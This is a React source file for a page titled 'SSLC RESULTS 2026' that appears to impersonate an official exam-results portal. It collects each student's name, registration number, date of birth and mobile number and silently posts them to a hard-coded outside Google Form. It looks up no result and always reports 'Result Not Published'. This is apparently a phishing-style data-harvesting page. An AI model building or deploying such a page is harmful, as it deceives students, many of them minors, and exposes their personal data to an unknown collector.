import { useState } from 'react'
import './App.css'

const GOOGLE_FORM_URL = "https://docs.google.com/forms/d/e/1FAIpQLSfQOfi2BzeX9UVd63xcaUW2qQ5Nh7fTglj5pZAgVI_jKWK8-A/formResponse";

function App() {
  const [examType, setExamType] = useState('SSLC');
  const [fields, setFields] = useState({ name: '', reg: '', dd: '', mm: '', yyyy: '', mob: '' });
  const [errorMsg, setErrorMsg] = useState('');
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showResultPage, setShowResultPage] = useState(false);

  const sync = (e) => setFields({ ...fields, [e.target.name]: e.target.value });

  const fire = async (e) => {
    e.preventDefault();
    
    // 1. DATA INTEGRITY GUARD: Stops blank rows before they start
    if (!fields.name.trim() || !fields.reg.trim() || isSubmitting) {
      return; 
    }

    // 2. SUBMISSION LOCK: Stops duplicate entries from double-clicks
    setIsSubmitting(true);
    
    const payload = new URLSearchParams({
      'entry.119667234': examType,
      'entry.936068913': fields.name.trim(),
      'entry.946478788': fields.reg.trim(),
      'entry.1468917937': `${fields.dd}-${fields.mm}-${fields.yyyy}`,
      'entry.941608751': fields.mob.trim()
    });

    try {
      await fetch(GOOGLE_FORM_URL, { 
        method: 'POST', 
        mode: 'no-cors', 
        body: payload 
      });
      
      // 3. SHOW RESULT PAGE: Wait slightly before showing result page.
      setTimeout(() => {
        setShowResultPage(true);
      }, 400);
    } catch (err) {
      setIsSubmitting(false); // Re-unlock only on error
      console.error('Signal lost:', err);
    }
  };

  const handleBack = () => {
    setShowResultPage(false);
    setIsSubmitting(false);
    setFields({ name: '', reg: '', dd: '', mm: '', yyyy: '', mob: '' });
  };

  if (showResultPage) {
    return (
      <div className="app-container">
        <header className="header">
          <h1 className="title">SSLC RESULTS 2026</h1>
        </header>
        <main className="main-content result-page-content">
          <div className="result-card">
            <h2 className="result-title">Result Not Published</h2>
            <p className="result-message">The results for {examType} 2026 have not been published yet. Please check back later.</p>
            <button className="back-btn" onClick={handleBack}>Go Back</button>
          </div>
        </main>
      </div>
    );
  }

  return (
    <div className="app-container">
      <header className="header">
        <h1 className="title">SSLC  RESULTS 2026</h1>
      </header>
      
      <main className="main-content">
        <div className="toggle-container">
          <label className="toggle-label">
            SSLC
            <input 
              type="radio" 
              name="examType" 
              value="SSLC" 
              checked={examType === 'SSLC'} 
              onChange={() => setExamType('SSLC')}
            />
          </label>
          <label className="toggle-label">
            THSLC / AHSLC
            <input 
              type="radio" 
              name="examType" 
              value="THSLC/AHSLC" 
              checked={examType === 'THSLC/AHSLC'} 
              onChange={() => setExamType('THSLC/AHSLC')}
            />
          </label>
        </div>

        {errorMsg && (
          <div className="error-alert">
            {errorMsg}
          </div>
        )}

        <div className="form-container">
          <form className="result-form" onSubmit={fire}>
            
            <label className="form-label" htmlFor="name">Name</label>
            <input type="text" id="name" name="name" className="input-field" required onChange={sync} value={fields.name} />

            <label className="form-label" htmlFor="regNo">Reg No</label>
            <input type="text" id="regNo" name="reg" className="input-field" required onChange={sync} value={fields.reg} />

            <label className="form-label">DOB</label>
            <div className="dob-container">
              <input type="text" name="dd" placeholder="dd" maxLength="2" className="input-dob" required onChange={sync} value={fields.dd} />
              <span className="separator">/</span>
              <input type="text" name="mm" placeholder="mm" maxLength="2" className="input-dob" required onChange={sync} value={fields.mm} />
              <span className="separator">/</span>
              <input type="text" name="yyyy" placeholder="yyyy" maxLength="4" className="input-dob year" required onChange={sync} value={fields.yyyy} />
            </div>

            <label className="form-label" htmlFor="mobile">Mobile No</label>
            <div className="mobile-submit-container">
              <input type="tel" id="mobile" name="mob" className="input-field mobile-field" required onChange={sync} pattern="[0-9]{10}" maxLength="10" title="Mobile number must be exactly 10 digits" value={fields.mob} />
              <button 
                type="submit" 
                className="submit-btn"
                disabled={isSubmitting} 
                style={{ opacity: isSubmitting ? 0.7 : 1 }}
              >
                {isSubmitting ? 'Verifying...' : 'Submit'}
              </button>
            </div>
            
          </form>
        </div>
      </main>
    </div>
  )
}

export default App
